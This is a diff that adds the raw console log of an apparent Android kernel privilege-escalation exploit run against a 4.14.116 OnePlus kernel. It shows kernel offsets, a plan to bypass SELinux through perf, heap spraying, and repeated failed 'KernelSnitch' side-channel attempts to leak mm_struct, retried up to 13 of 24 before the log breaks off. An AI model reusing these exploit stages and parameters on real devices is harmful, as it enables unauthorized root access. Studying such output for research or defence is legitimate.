@@ -1,0 +1,493 @@
+[33m[*] [0mkernel: 4.14.116
+[32m[+] [0moffsets matched: 4.14.116
+[33m[*] [0minit_cred image=ffffff800af640b0 alias=ffffff8002f640b0
+[32m[+] [0mstartup context pid=7278 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
+[32m[+] [0mstartup limits pid=7278 NoNewPrivs=0 Seccomp=0 Seccomp_filters=?
+[32m[+] [0mbuild config pid=7278 label=ghostlock_oneplus slide=pselect main=pselect
+[32m[+] [0mp0 profile pid=7278 phys_offset=0000000000000000 kernel_phys_load=0000000000080000 delta=0000000000080000 slide_logger=ffffff802a4021a0 bootid_data=ffffff802a6aa868 init_task=ffffff802a40cf00 root_tg=ffffff802a63d580 sysctl_bootid=ffffff802a6aa868
+[33m[*] [0mp0 kernel_phys_load=0000000000080000 phys_offset=0000000000000000 delta=0000000000080000
+[33m[*] [0m[T+0ms] exploit start
+[33m[*] [0mselinux_enforcing absent (4.14 CDY) - unblocking perf instead of W1
+[33m[*] [0m=== W1c: perf unblock === target=0xffffff8002f421e8 mode=1
+[33m[*] [0m[T+3ms]   heap spray start
+[33m[*] [0mKernelSnitch setup: cpus=8 mm_per_slab=34 prep=1088 spray=204 pre=33 post=34
+[33m[*] [0mparameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (16) mte disabled
+[33m[*] [0mKernelSnitch parameters: threads=8 collisions=16 futexes=262144 identity_step=0x40000000
+[33m[*] [0mstart finding collisisons
+[33m[*] [0mtarget    000000710cee00c8
+[33m[*] [0m  00000051ec73d3d8[33m[*] [0m  00000051ec878db0[33m[*] [0m  00000051ec8fe1e0[33m[*] [0m  00000051ec9ff9e8[33m[*] [0m  00000051eca2db58[33m[*] [0m  00000051eca96ea0[33m[*] [0m  00000051ecb3b3c8[33m[*] [0m  00000051ecc7bdc8[33m[*] [0m  00000051eceaef60[33m[*] [0m  00000051ecfc07f0[33m[*] [0m  00000051ed0aef60[33m[*] [0m  00000051ed13c3d0[33m[*] [0m  00000051ed38b648[33m[*] [0m  00000051ed4a7f28[33m[*] [0m  00000051ed5192b8[33m[*] [0mfound 15 collisisons
+[33m[*] [0m[p1] spray: pre/post mms killed, waiting leak child[33m[*] [0mKernelSnitch collisions: found
+[33m[*] [0m[p2] collisions ok, launching bruteforce[33m[*] [0mstart bruteforcing
+[33m[*] [0m[  3] start finding mm_struct [ffffff80c0000000-ffffff8100000000]
+[33m[*] [0m[  7] start finding mm_struct [ffffff81c0000000-ffffff8200000000]
+[33m[*] [0m[  0] start finding mm_struct [ffffff8000000000-ffffff8040000000]
+[33m[*] [0m[  6] start finding mm_struct [ffffff8180000000-ffffff81c0000000]
+[33m[*] [0m[  1] start finding mm_struct [ffffff8040000000-ffffff8080000000]
+[33m[*] [0m[  2] start finding mm_struct [ffffff8080000000-ffffff80c0000000]
+[33m[*] [0m[  5] start finding mm_struct [ffffff8140000000-ffffff8180000000]
+[33m[*] [0m[  4] start finding mm_struct [ffffff8100000000-ffffff8140000000]
+[33m[*] [0m[p3] bruteforce returned cnt=0 best=0[33m[*] [0mKernelSnitch bruteforce: state=5 found=0 mm_struct=0xffffffffffffffff
+[31m[-] [0mKernelSnitch mm_struct leak failed
+[33m[*] [0mdone
+[31m[-] [0mprepare_kernel_page retry 1/24
+[33m[*] [0mKernelSnitch setup: cpus=8 mm_per_slab=34 prep=1088 spray=204 pre=33 post=34
+[33m[*] [0mparameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (16) mte disabled
+[33m[*] [0mKernelSnitch parameters: threads=8 collisions=16 futexes=262144 identity_step=0x40000000
+[33m[*] [0mstart finding collisisons
+[33m[*] [0mtarget    000000710cee00c8
+[33m[*] [0m  00000051ec7b1778[33m[*] [0m  00000051ec95b4c8[33m[*] [0m  00000051eca1eae0[33m[*] [0m  00000051ecc83e08[33m[*] [0m  00000051ecca3f08[33m[*] [0m  00000051ecd8e660[33m[*] [0m  00000051ed02cb50[33m[*] [0m  00000051ed07cdd0[33m[*] [0m  00000051ed1d1878[33m[*] [0m  00000051ed257ca8[33m[*] [0m  00000051ed305218[33m[*] [0m  00000051ed4c4010[33m[*] [0m  00000051ed667d28[33m[*] [0m  00000051ed66fd68[33m[*] [0m  00000051ed67ddd8[33m[*] [0mfound 15 collisisons
+[33m[*] [0m[p1] spray: pre/post mms killed, waiting leak child[33m[*] [0mKernelSnitch collisions: found
+[33m[*] [0m[p2] collisions ok, launching bruteforce[33m[*] [0mstart bruteforcing
+[33m[*] [0m[  3] start finding mm_struct [ffffff80c0000000-ffffff8100000000]
+[33m[*] [0m[  6] start finding mm_struct [ffffff8180000000-ffffff81c0000000]
+[33m[*] [0m[  5] start finding mm_struct [ffffff8140000000-ffffff8180000000]
+[33m[*] [0m[  0] start finding mm_struct [ffffff8000000000-ffffff8040000000]
+[33m[*] [0m[  2] start finding mm_struct [ffffff8080000000-ffffff80c0000000]
+[33m[*] [0m[  1] start finding mm_struct [ffffff8040000000-ffffff8080000000]
+[33m[*] [0m[  7] start finding mm_struct [ffffff81c0000000-ffffff8200000000]
+[33m[*] [0m[  4] start finding mm_struct [ffffff8100000000-ffffff8140000000]
+[33m[*] [0m[p3] bruteforce returned cnt=0 best=0[33m[*] [0mKernelSnitch bruteforce: state=5 found=0 mm_struct=0xffffffffffffffff
+[31m[-] [0mKernelSnitch mm_struct leak failed
+[33m[*] [0mdone
+[31m[-] [0mprepare_kernel_page retry 2/24
+[33m[*] [0mKernelSnitch setup: cpus=8 mm_per_slab=34 prep=1088 spray=204 pre=33 post=34
+[33m[*] [0mparameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (16) mte disabled
+[33m[*] [0mKernelSnitch parameters: threads=8 collisions=16 futexes=262144 identity_step=0x40000000
+[33m[*] [0mstart finding collisisons
+[33m[*] [0mtarget    000000710cee00c8
+[33m[*] [0m  00000051ec77e5e0[33m[*] [0m  00000051ec8a8f30[33m[*] [0m  00000051ec8aaf40[33m[*] [0m  00000051eca0ba48[33m[*] [0m  00000051ecaa8f30[33m[*] [0m  00000051ecb14290[33m[*] [0m  00000051ecb2d358[33m[*] [0m  00000051ecb7f5e8[33m[*] [0m  00000051ecbc07f0[33m[*] [0m  00000051ecc3fbe8[33m[*] [0m  00000051ecd2e360[33m[*] [0m  00000051ece89e38[33m[*] [0m  00000051ecf50470[33m[*] [0m  00000051ed125318[33m[*] [0m  00000051ed145418[33m[*] [0mfound 15 collisisons
+[33m[*] [0m[p1] spray: pre/post mms killed, waiting leak child[33m[*] [0mKernelSnitch collisions: found
+[33m[*] [0m[p2] collisions ok, launching bruteforce[33m[*] [0mstart bruteforcing
+[33m[*] [0m[  7] start finding mm_struct [ffffff81c0000000-ffffff8200000000]
+[33m[*] [0m[  1] start finding mm_struct [ffffff8040000000-ffffff8080000000]
+[33m[*] [0m[  0] start finding mm_struct [ffffff8000000000-ffffff8040000000]
+[33m[*] [0m[  3] start finding mm_struct [ffffff80c0000000-ffffff8100000000]
+[33m[*] [0m[  6] start finding mm_struct [ffffff8180000000-ffffff81c0000000]
+[33m[*] [0m[  5] start finding mm_struct [ffffff8140000000-ffffff8180000000]
+[33m[*] [0m[  4] start finding mm_struct [ffffff8100000000-ffffff8140000000]
+[33m[*] [0m[  2] start finding mm_struct [ffffff8080000000-ffffff80c0000000]
+[33m[*] [0m[p3] bruteforce returned cnt=0 best=0[33m[*] [0mKernelSnitch bruteforce: state=5 found=0 mm_struct=0xffffffffffffffff
+[31m[-] [0mKernelSnitch mm_struct leak failed
+[33m[*] [0mdone
+[31m[-] [0mprepare_kernel_page retry 3/24
+[33m[*] [0mKernelSnitch setup: cpus=8 mm_per_slab=34 prep=1088 spray=204 pre=33 post=34
+[33m[*] [0mparameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (16) mte disabled
+[33m[*] [0mKernelSnitch parameters: threads=8 collisions=16 futexes=262144 identity_step=0x40000000
+[33m[*] [0mstart finding collisisons
+[33m[*] [0mtarget    000000710cee00c8
+[33m[*] [0m  00000051ec6ee160[33m[*] [0m  00000051ec85ece0[33m[*] [0m  00000051ec934390[33m[*] [0m  00000051ec963508[33m[*] [0m  00000051eca6bd48[33m[*] [0m  00000051ecaef168[33m[*] [0m  00000051ecb815f8[33m[*] [0m  00000051ecdbe7e0[33m[*] [0m  00000051ece58cb0[33m[*] [0m  00000051ece60cf0[33m[*] [0m  00000051ececb048[33m[*] [0m  00000051ecf4c450[33m[*] [0m  00000051ed073d88[33m[*] [0m  00000051ed1cc850[33m[*] [0m  00000051ed46dd58[33m[*] [0mfound 15 collisisons
+[33m[*] [0m[p1] spray: pre/post mms killed, waiting leak child[33m[*] [0mKernelSnitch collisions: found
+[33m[*] [0m[p2] collisions ok, launching bruteforce[33m[*] [0mstart bruteforcing
+[33m[*] [0m[  3] start finding mm_struct [ffffff80c0000000-ffffff8100000000]
+[33m[*] [0m[  6] start finding mm_struct [ffffff8180000000-ffffff81c0000000]
+[33m[*] [0m[  4] start finding mm_struct [ffffff8100000000-ffffff8140000000]
+[33m[*] [0m[  0] start finding mm_struct [ffffff8000000000-ffffff8040000000]
+[33m[*] [0m[  1] start finding mm_struct [ffffff8040000000-ffffff8080000000]
+[33m[*] [0m[  2] start finding mm_struct [ffffff8080000000-ffffff80c0000000]
+[33m[*] [0m[  5] start finding mm_struct [ffffff8140000000-ffffff8180000000]
+[33m[*] [0m[  7] start finding mm_struct [ffffff81c0000000-ffffff8200000000]
+[33m[*] [0m[p3] bruteforce returned cnt=0 best=0[33m[*] [0mKernelSnitch bruteforce: state=5 found=0 mm_struct=0xffffffffffffffff
+[31m[-] [0mKernelSnitch mm_struct leak failed
+[33m[*] [0mdone
+[31m[-] [0mprepare_kernel_page retry 4/24
+[33m[*] [0mKernelSnitch setup: cpus=8 mm_per_slab=34 prep=1088 spray=204 pre=33 post=34
+[33m[*] [0mparameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (16) mte disabled
+[33m[*] [0mKernelSnitch parameters: threads=8 collisions=16 futexes=262144 identity_step=0x40000000
+[33m[*] [0mstart finding collisisons
+[33m[*] [0mtarget    000000710cee00c8
+[33m[*] [0m  00000051ec706220[33m[*] [0m  00000051ec7bd7d8[33m[*] [0m  00000051ec8adf58[33m[*] [0m  00000051ec905218[33m[*] [0m  00000051eca9fee8[33m[*] [0m  00000051ecb775a8[33m[*] [0m  00000051ecb89638[33m[*] [0m  00000051ecceb148[33m[*] [0m  00000051eced0070[33m[*] [0m  00000051ecf5f4e8[33m[*] [0m  00000051ecff79a8[33m[*] [0m  00000051ed149438[33m[*] [0m  00000051ed1f5998[33m[*] [0m  00000051ed22cb50[33m[*] [0m  00000051ed269d38[33m[*] [0mfound 15 collisisons
+[33m[*] [0m[p1] spray: pre/post mms killed, waiting leak child[33m[*] [0mKernelSnitch collisions: found
+[33m[*] [0m[p2] collisions ok, launching bruteforce[33m[*] [0mstart bruteforcing
+[33m[*] [0m[  3] start finding mm_struct [ffffff80c0000000-ffffff8100000000]
+[33m[*] [0m[  6] start finding mm_struct [ffffff8180000000-ffffff81c0000000]
+[33m[*] [0m[  5] start finding mm_struct [ffffff8140000000-ffffff8180000000]
+[33m[*] [0m[  0] start finding mm_struct [ffffff8000000000-ffffff8040000000]
+[33m[*] [0m[  4] start finding mm_struct [ffffff8100000000-ffffff8140000000]
+[33m[*] [0m[  1] start finding mm_struct [ffffff8040000000-ffffff8080000000]
+[33m[*] [0m[  7] start finding mm_struct [ffffff81c0000000-ffffff8200000000]
+[33m[*] [0m[  2] start finding mm_struct [ffffff8080000000-ffffff80c0000000]
+[33m[*] [0m[p3] bruteforce returned cnt=0 best=0[33m[*] [0mKernelSnitch bruteforce: state=5 found=0 mm_struct=0xffffffffffffffff
+[31m[-] [0mKernelSnitch mm_struct leak failed
+[33m[*] [0mdone
+[31m[-] [0mprepare_kernel_page retry 5/24
+[33m[*] [0mKernelSnitch setup: cpus=8 mm_per_slab=34 prep=1088 spray=204 pre=33 post=34
+[33m[*] [0mparameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (16) mte disabled
+[33m[*] [0mKernelSnitch parameters: threads=8 collisions=16 futexes=262144 identity_step=0x40000000
+[33m[*] [0mstart finding collisisons
+[33m[*] [0mtarget    000000710cee00c8
+[33m[*] [0m  00000051ec712280[33m[*] [0m  00000051ec815a98[33m[*] [0m  00000051ecab3f88[33m[*] [0m  00000051ecca2f00[33m[*] [0m  00000051ecd4b448[33m[*] [0m  00000051ecea6f20[33m[*] [0m  00000051ecf7d5d8[33m[*] [0m  00000051ed030b70[33m[*] [0m  00000051ed032b80[33m[*] [0m  00000051ed128330[33m[*] [0m  00000051ed1a4710[33m[*] [0m  00000051ed226b20[33m[*] [0m  00000051ed234b90[33m[*] [0m  00000051ed29fee8[33m[*] [0m  00000051ed365518[33m[*] [0mfound 15 collisisons
+[33m[*] [0m[p1] spray: pre/post mms killed, waiting leak child[33m[*] [0mKernelSnitch collisions: found
+[33m[*] [0m[p2] collisions ok, launching bruteforce[33m[*] [0mstart bruteforcing
+[33m[*] [0m[  7] start finding mm_struct [ffffff81c0000000-ffffff8200000000]
+[33m[*] [0m[  6] start finding mm_struct [ffffff8180000000-ffffff81c0000000]
+[33m[*] [0m[  0] start finding mm_struct [ffffff8000000000-ffffff8040000000]
+[33m[*] [0m[  2] start finding mm_struct [ffffff8080000000-ffffff80c0000000]
+[33m[*] [0m[  3] start finding mm_struct [ffffff80c0000000-ffffff8100000000]
+[33m[*] [0m[  4] start finding mm_struct [ffffff8100000000-ffffff8140000000]
+[33m[*] [0m[  5] start finding mm_struct [ffffff8140000000-ffffff8180000000]
+[33m[*] [0m[  1] start finding mm_struct [ffffff8040000000-ffffff8080000000]
+[33m[*] [0m[p3] bruteforce returned cnt=0 best=0[33m[*] [0mKernelSnitch bruteforce: state=5 found=0 mm_struct=0xffffffffffffffff
+[31m[-] [0mKernelSnitch mm_struct leak failed
+[33m[*] [0mdone
+[31m[-] [0mprepare_kernel_page retry 6/24
+[33m[*] [0mKernelSnitch setup: cpus=8 mm_per_slab=34 prep=1088 spray=204 pre=33 post=34
+[33m[*] [0mparameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (16) mte disabled
+[33m[*] [0mKernelSnitch parameters: threads=8 collisions=16 futexes=262144 identity_step=0x40000000
+[33m[*] [0mstart finding collisisons
+[33m[*] [0mtarget    000000710cee00c8
+[33m[*] [0m  00000051ec72b348[33m[*] [0m  00000051ec7ed958[33m[*] [0m  00000051ec9a4710[33m[*] [0m  00000051ec9e6920[33m[*] [0m  00000051ecab6fa0[33m[*] [0m  00000051ecc2cb50[33m[*] [0m  00000051ecc9ded8[33m[*] [0m  00000051ecd5b4c8[33m[*] [0m  00000051ed1373a8[33m[*] [0m  00000051ed1b2780[33m[*] [0m  00000051ed30c250[33m[*] [0m  00000051ed30d258[33m[*] [0m  00000051ed3e6920[33m[*] [0m  00000051ed4aff68[33m[*] [0m  00000051ed4ca040[33m[*] [0mfound 15 collisisons
+[33m[*] [0m[p1] spray: pre/post mms killed, waiting leak child[33m[*] [0mKernelSnitch collisions: found
+[33m[*] [0m[p2] collisions ok, launching bruteforce[33m[*] [0mstart bruteforcing
+[33m[*] [0m[  5] start finding mm_struct [ffffff8140000000-ffffff8180000000]
+[33m[*] [0m[  3] start finding mm_struct [ffffff80c0000000-ffffff8100000000]
+[33m[*] [0m[  4] start finding mm_struct [ffffff8100000000-ffffff8140000000]
+[33m[*] [0m[  0] start finding mm_struct [ffffff8000000000-ffffff8040000000]
+[33m[*] [0m[  2] start finding mm_struct [ffffff8080000000-ffffff80c0000000]
+[33m[*] [0m[  1] start finding mm_struct [ffffff8040000000-ffffff8080000000]
+[33m[*] [0m[  7] start finding mm_struct [ffffff81c0000000-ffffff8200000000]
+[33m[*] [0m[  6] start finding mm_struct [ffffff8180000000-ffffff81c0000000]
+[33m[*] [0m[p3] bruteforce returned cnt=0 best=0[33m[*] [0mKernelSnitch bruteforce: state=5 found=0 mm_struct=0xffffffffffffffff
+[31m[-] [0mKernelSnitch mm_struct leak failed
+[33m[*] [0mdone
+[31m[-] [0mprepare_kernel_page retry 7/24
+[33m[*] [0mKernelSnitch setup: cpus=8 mm_per_slab=34 prep=1088 spray=204 pre=33 post=34
+[33m[*] [0mparameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (16) mte disabled
+[33m[*] [0mKernelSnitch parameters: threads=8 collisions=16 futexes=262144 identity_step=0x40000000
+[33m[*] [0mstart finding collisisons
+[33m[*] [0mtarget    000000710cee00c8
+[33m[*] [0m  00000051ec78e660[33m[*] [0m  00000051ec7ed958[33m[*] [0m  00000051ec7f3988[33m[*] [0m  00000051ec80da58[33m[*] [0m  00000051ec86fd68[33m[*] [0m  00000051ec9011f8[33m[*] [0m  00000051ecdea940[33m[*] [0m  00000051ece1bac8[33m[*] [0m  00000051ecf976a8[33m[*] [0m  00000051ed00da58[33m[*] [0m  00000051ed0d90b8[33m[*] [0m  00000051ed461cf8[33m[*] [0m  00000051ed49ced0[33m[*] [0m  00000051ed59f6e8[33m[*] [0m  00000051ed774590[33m[*] [0mfound 15 collisisons
+[33m[*] [0m[p1] spray: pre/post mms killed, waiting leak child[33m[*] [0mKernelSnitch collisions: found
+[33m[*] [0m[p2] collisions ok, launching bruteforce[33m[*] [0mstart bruteforcing
+[33m[*] [0m[  3] start finding mm_struct [ffffff80c0000000-ffffff8100000000]
+[33m[*] [0m[  6] start finding mm_struct [ffffff8180000000-ffffff81c0000000]
+[33m[*] [0m[  0] start finding mm_struct [ffffff8000000000-ffffff8040000000]
+[33m[*] [0m[  7] start finding mm_struct [ffffff81c0000000-ffffff8200000000]
+[33m[*] [0m[  1] start finding mm_struct [ffffff8040000000-ffffff8080000000]
+[33m[*] [0m[  4] start finding mm_struct [ffffff8100000000-ffffff8140000000]
+[33m[*] [0m[  5] start finding mm_struct [ffffff8140000000-ffffff8180000000]
+[33m[*] [0m[  2] start finding mm_struct [ffffff8080000000-ffffff80c0000000]
+[33m[*] [0m[p3] bruteforce returned cnt=0 best=0[33m[*] [0mKernelSnitch bruteforce: state=5 found=0 mm_struct=0xffffffffffffffff
+[31m[-] [0mKernelSnitch mm_struct leak failed
+[33m[*] [0mdone
+[31m[-] [0mprepare_kernel_page retry 8/24
+[33m[*] [0mKernelSnitch setup: cpus=8 mm_per_slab=34 prep=1088 spray=204 pre=33 post=34
+[33m[*] [0mparameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (16) mte disabled
+[33m[*] [0mKernelSnitch parameters: threads=8 collisions=16 futexes=262144 identity_step=0x40000000
+[33m[*] [0mstart finding collisisons
+[33m[*] [0mtarget    000000710cee00c8
+[33m[*] [0m  00000051ec723308[33m[*] [0m  00000051ec983608[33m[*] [0m  00000051ec99f6e8[33m[*] [0m  00000051ecac6020[33m[*] [0m  00000051ecb4c450[33m[*] [0m  00000051ecbae760[33m[*] [0m  00000051ecc96ea0[33m[*] [0m  00000051ecc9ced0[33m[*] [0m  00000051ecda7728[33m[*] [0m  00000051ed031b78[33m[*] [0m  00000051ed05fce8[33m[*] [0m  00000051ed1b1778[33m[*] [0m  00000051ed2db0c8[33m[*] [0m  00000051ed31e2e0[33m[*] [0m  00000051ed32c350[33m[*] [0mfound 15 collisisons
+[33m[*] [0m[p1] spray: pre/post mms killed, waiting leak child[33m[*] [0mKernelSnitch collisions: found
+[33m[*] [0m[p2] collisions ok, launching bruteforce[33m[*] [0mstart bruteforcing
+[33m[*] [0m[  3] start finding mm_struct [ffffff80c0000000-ffffff8100000000]
+[33m[*] [0m[  5] start finding mm_struct [ffffff8140000000-ffffff8180000000]
+[33m[*] [0m[  4] start finding mm_struct [ffffff8100000000-ffffff8140000000]
+[33m[*] [0m[  0] start finding mm_struct [ffffff8000000000-ffffff8040000000]
+[33m[*] [0m[  7] start finding mm_struct [ffffff81c0000000-ffffff8200000000]
+[33m[*] [0m[  1] start finding mm_struct [ffffff8040000000-ffffff8080000000]
+[33m[*] [0m[  2] start finding mm_struct [ffffff8080000000-ffffff80c0000000]
+[33m[*] [0m[  6] start finding mm_struct [ffffff8180000000-ffffff81c0000000]
+[33m[*] [0m[p3] bruteforce returned cnt=0 best=0[33m[*] [0mKernelSnitch bruteforce: state=5 found=0 mm_struct=0xffffffffffffffff
+[31m[-] [0mKernelSnitch mm_struct leak failed
+[33m[*] [0mdone
+[31m[-] [0mprepare_kernel_page retry 9/24
+[33m[*] [0mKernelSnitch setup: cpus=8 mm_per_slab=34 prep=1088 spray=204 pre=33 post=34
+[33m[*] [0mparameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (16) mte disabled
+[33m[*] [0mKernelSnitch parameters: threads=8 collisions=16 futexes=262144 identity_step=0x40000000
+[33m[*] [0mstart finding collisisons
+[33m[*] [0mtarget    000000710cee00c8
+[33m[*] [0m  00000051ec6d3088[33m[*] [0m  00000051ec75f4e8[33m[*] [0m  00000051ec7bf7e8[33m[*] [0m  00000051ec80ba48[33m[*] [0m  00000051ec81aac0[33m[*] [0m  00000051ec83ebe0[33m[*] [0m  00000051ec8d3088[33m[*] [0m  00000051ec954490[33m[*] [0m  00000051ec989638[33m[*] [0m  00000051eccde0e0[33m[*] [0m  00000051ecd10270[33m[*] [0m  00000051ece43c08[33m[*] [0m  00000051ececa040[33m[*] [0m  00000051eced2080[33m[*] [0m  00000051ecf33388[33m[*] [0mfound 15 collisisons
+[33m[*] [0m[p1] spray: pre/post mms killed, waiting leak child[33m[*] [0mKernelSnitch collisions: found
+[33m[*] [0m[p2] collisions ok, launching bruteforce[33m[*] [0mstart bruteforcing
+[33m[*] [0m[  4] start finding mm_struct [ffffff8100000000-ffffff8140000000]
+[33m[*] [0m[  0] start finding mm_struct [ffffff8000000000-ffffff8040000000]
+[33m[*] [0m[  6] start finding mm_struct [ffffff8180000000-ffffff81c0000000]
+[33m[*] [0m[  3] start finding mm_struct [ffffff80c0000000-ffffff8100000000]
+[33m[*] [0m[  1] start finding mm_struct [ffffff8040000000-ffffff8080000000]
+[33m[*] [0m[  2] start finding mm_struct [ffffff8080000000-ffffff80c0000000]
+[33m[*] [0m[  5] start finding mm_struct [ffffff8140000000-ffffff8180000000]
+[33m[*] [0m[  7] start finding mm_struct [ffffff81c0000000-ffffff8200000000]
+[33m[*] [0m[p3] bruteforce returned cnt=0 best=0[33m[*] [0mKernelSnitch bruteforce: state=5 found=0 mm_struct=0xffffffffffffffff
+[31m[-] [0mKernelSnitch mm_struct leak failed
+[33m[*] [0mdone
+[31m[-] [0mprepare_kernel_page retry 10/24
+[33m[*] [0mKernelSnitch setup: cpus=8 mm_per_slab=34 prep=1088 spray=204 pre=33 post=34
+[33m[*] [0mparameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (16) mte disabled
+[33m[*] [0mKernelSnitch parameters: threads=8 collisions=16 futexes=262144 identity_step=0x40000000
+[33m[*] [0mstart finding collisisons
+[33m[*] [0mtarget    000000710cee00c8
+[33m[*] [0m  00000051ec9af768[33m[*] [0m  00000051eca4ec60[33m[*] [0m  00000051ecac9038[33m[*] [0m  00000051ecb32380[33m[*] [0m  00000051ecba6720[33m[*] [0m  00000051ece5fce8[33m[*] [0m  00000051ecebffe8[33m[*] [0m  00000051ecf0b248[33m[*] [0m  00000051ecf15298[33m[*] [0m  00000051ecf51478[33m[*] [0m  00000051ecf82600[33m[*] [0m  00000051ecfad758[33m[*] [0m  00000051ecfc4810[33m[*] [0m  00000051ed18c650[33m[*] [0m  00000051ed254c90[33m[*] [0mfound 15 collisisons
+[33m[*] [0m[p1] spray: pre/post mms killed, waiting leak child[33m[*] [0mKernelSnitch collisions: found
+[33m[*] [0m[p2] collisions ok, launching bruteforce[33m[*] [0mstart bruteforcing
+[33m[*] [0m[  4] start finding mm_struct [ffffff8100000000-ffffff8140000000]
+[33m[*] [0m[  3] start finding mm_struct [ffffff80c0000000-ffffff8100000000]
+[33m[*] [0m[  6] start finding mm_struct [ffffff8180000000-ffffff81c0000000]
+[33m[*] [0m[  0] start finding mm_struct [ffffff8000000000-ffffff8040000000]
+[33m[*] [0m[  2] start finding mm_struct [ffffff8080000000-ffffff80c0000000]
+[33m[*] [0m[  1] start finding mm_struct [ffffff8040000000-ffffff8080000000]
+[33m[*] [0m[  7] start finding mm_struct [ffffff81c0000000-ffffff8200000000]
+[33m[*] [0m[  5] start finding mm_struct [ffffff8140000000-ffffff8180000000]
+[33m[*] [0m[p3] bruteforce returned cnt=0 best=0[33m[*] [0mKernelSnitch bruteforce: state=5 found=0 mm_struct=0xffffffffffffffff
+[31m[-] [0mKernelSnitch mm_struct leak failed
+[33m[*] [0mdone
+[31m[-] [0mprepare_kernel_page retry 11/24
+[33m[*] [0mKernelSnitch setup: cpus=8 mm_per_slab=34 prep=1088 spray=204 pre=33 post=34
+[33m[*] [0mparameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (16) mte disabled
+[33m[*] [0mKernelSnitch parameters: threads=8 collisions=16 futexes=262144 identity_step=0x40000000
+[33m[*] [0mstart finding collisisons
+[33m[*] [0mtarget    000000710cee00c8
+[33m[*] [0m  00000051ec766520[33m[*] [0m  00000051ec7ea940[33m[*] [0m  00000051ec81bac8[33m[*] [0m  00000051ec89fee8[33m[*] [0m  00000051ec98a640[33m[*] [0m  00000051eca10a70[33m[*] [0m  00000051ecb1f2e8[33m[*] [0m  00000051ecd45418[33m[*] [0m  00000051ecdea940[33m[*] [0m  00000051ece4bc48[33m[*] [0m  00000051eced2080[33m[*] [0m  00000051ecfbd7d8[33m[*] [0m  00000051ed1403f0[33m[*] [0m  00000051ed1ae760[33m[*] [0m  00000051ed38d658[33m[*] [0mfound 15 collisisons
+[33m[*] [0m[p1] spray: pre/post mms killed, waiting leak child[33m[*] [0mKernelSnitch collisions: found
+[33m[*] [0m[p2] collisions ok, launching bruteforce[33m[*] [0mstart bruteforcing
+[33m[*] [0m[  5] start finding mm_struct [ffffff8140000000-ffffff8180000000]
+[33m[*] [0m[  4] start finding mm_struct [ffffff8100000000-ffffff8140000000]
+[33m[*] [0m[  2] start finding mm_struct [ffffff8080000000-ffffff80c0000000]
+[33m[*] [0m[  6] start finding mm_struct [ffffff8180000000-ffffff81c0000000]
+[33m[*] [0m[  7] start finding mm_struct [ffffff81c0000000-ffffff8200000000]
+[33m[*] [0m[  3] start finding mm_struct [ffffff80c0000000-ffffff8100000000]
+[33m[*] [0m[  1] start finding mm_struct [ffffff8040000000-ffffff8080000000]
+[33m[*] [0m[  0] start finding mm_struct [ffffff8000000000-ffffff8040000000]
+[33m[*] [0m[p3] bruteforce returned cnt=0 best=0[33m[*] [0mKernelSnitch bruteforce: state=5 found=0 mm_struct=0xffffffffffffffff
+[31m[-] [0mKernelSnitch mm_struct leak failed
+[33m[*] [0mdone
+[31m[-] [0mprepare_kernel_page retry 12/24
+[33m[*] [0mKernelSnitch setup: cpus=8 mm_per_slab=34 prep=1088 spray=204 pre=33 post=34
+[33m[*] [0mparameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (16) mte disabled
+[33m[*] [0mKernelSnitch parameters: threads=8 collisions=16 futexes=262144 identity_step=0x40000000
+[33m[*] [0mstart finding collisisons
+[33m[*] [0mtarget    000000710cee00c8
+[33m[*] [0m  00000051ec6f91b8[33m[*] [0m  00000051ec815a98[33m[*] [0m  00000051eca2bb48[33m[*] [0m  00000051eca8fe68[33m[*] [0m  00000051ecaea140[33m[*] [0m  00000051ecc1dad8[33m[*] [0m  00000051ecc62d00[33m[*] [0m  00000051ecceb148[33m[*] [0m  00000051ecd795b8[33m[*] [0m  00000051ecd7f5e8[33m[*] [0m  00000051ecda5718[33m[*] [0m  00000051ece40bf0[33m[*] [0m  00000051ecffe9e0[33m[*] [0m  00000051ed278db0[33m[*] [0m  00000051ed3fc9d0[33m[*] [0mfound 15 collisisons
+[33m[*] [0m[p1] spray: pre/post mms killed, waiting leak child[33m[*] [0mKernelSnitch collisions: found
+[33m[*] [0m[p2] collisions ok, launching bruteforce[33m[*] [0mstart bruteforcing
+[33m[*] [0m[  3] start finding mm_struct [ffffff80c0000000-ffffff8100000000]
+[33m[*] [0m[  7] start finding mm_struct [ffffff81c0000000-ffffff8200000000]
+[33m[*] [0m[  5] start finding mm_struct [ffffff8140000000-ffffff8180000000]
+[33m[*] [0m[  0] start finding mm_struct [ffffff8000000000-ffffff8040000000]
+[33m[*] [0m[  4] start finding mm_struct [ffffff8100000000-ffffff8140000000]
+[33m[*] [0m[  1] start finding mm_struct [ffffff8040000000-ffffff8080000000]
+[33m[*] [0m[  6] start finding mm_struct [ffffff8180000000-ffffff81c0000000]
+[33m[*] [0m[  2] start finding mm_struct [ffffff8080000000-ffffff80c0000000]
+[33m[*] [0m[p3] bruteforce returned cnt=0 best=0[33m[*] [0mKernelSnitch bruteforce: state=5 found=0 mm_struct=0xffffffffffffffff
+[31m[-] [0mKernelSnitch mm_struct leak failed
+[33m[*] [0mdone
+[31m[-] [0mprepare_kernel_page retry 13/24
+[33m[*] [0mKernelSnitch setup: cpus=8 mm_per_slab=34 prep=1088 spray=204 pre=33 post=34
+[33m[*] [0mparameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (16) mte disabled
+[33m[*] [0mKernelSnitch parameters: threads=8 collisions=16 futexes=262144 identity_step=0x40000000
+[33m[*] [0mstart finding collisisons
+[33m[*] [0mtarget    000000710cee00c8
